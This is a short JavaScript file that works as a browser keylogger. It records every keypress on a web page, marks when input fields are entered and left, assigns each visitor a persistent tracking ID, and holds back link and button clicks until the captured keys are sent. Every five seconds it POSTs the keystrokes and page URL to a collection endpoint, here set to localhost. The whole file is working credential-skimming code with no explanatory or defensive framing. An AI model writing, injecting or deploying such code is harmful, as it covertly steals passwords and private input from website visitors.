const url = 'http://localhost:3000/keylog-data'
const site = document.location;
let id = window.localStorage.getItem('_-_-_id_-_-_');

if (id === null) {
  window.localStorage.setItem('_-_-_id_-_-_', `${Date.now()}.${Math.floor(Math.random() * 1000)}`);
  id = window.localStorage.getItem('_-_-_id_-_-_');
}

const headers = new Headers({
  "Content-Type": "application/json",
});

let keys = '';

document.onkeypress = (event) => {
  keys += event.key;
};

const inputs = document.getElementsByTagName('input');

for (let i =0; i < inputs.length; i += 1) {
  inputs[i].addEventListener('focus', () => {
    keys += '>>>';
  });
  inputs[i].addEventListener('blur', () => {
    keys += '<<<';
  });
}

const links = document.querySelectorAll('a, button');

for(let i = 0; i < links.length; i += 1) {
  links[i].addEventListener('click', (event) => {
    if (keys !== '') {
      event.preventDefault();
      event.stopPropagation();
      send(() => {
        event.target.click();
      });
    }
  });
}

setInterval(send, 5000);

function send(cb) {
  if (keys === '') {
    return;
  }
  const lockKey = keys;
  keys = '';
  const data = {
    url: window.location.origin + window.location.pathname,
    id,
    keys: lockKey,
  }
  fetch(url, {
    method: 'POST',
    headers,
    body: JSON.stringify(data),
  }).then(cb);
}

